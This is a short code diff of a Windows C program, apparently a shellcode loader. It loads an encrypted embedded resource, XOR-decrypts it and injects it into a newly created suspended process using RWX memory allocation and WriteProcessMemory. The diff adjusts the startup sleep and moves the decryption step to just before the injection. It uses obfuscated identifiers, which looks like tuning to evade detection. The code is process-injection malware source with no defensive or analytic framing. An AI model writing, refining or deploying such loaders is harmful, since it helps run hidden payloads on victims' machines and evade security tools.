@@ -22,7 +22,7 @@ void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k
 }
 
 int main() {
-    Sleep(2000);
+    Sleep(2500);
 
     
     char* key101k;
@@ -32,9 +32,6 @@ int main() {
     char* code199k;
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
-
-    // Decrypt the payload
-    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
 
     // Create a new process in a suspended state
     STARTUPINFO si = {0};
@@ -51,7 +48,7 @@ int main() {
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
+    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
 
     // Write payload to target process
     WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
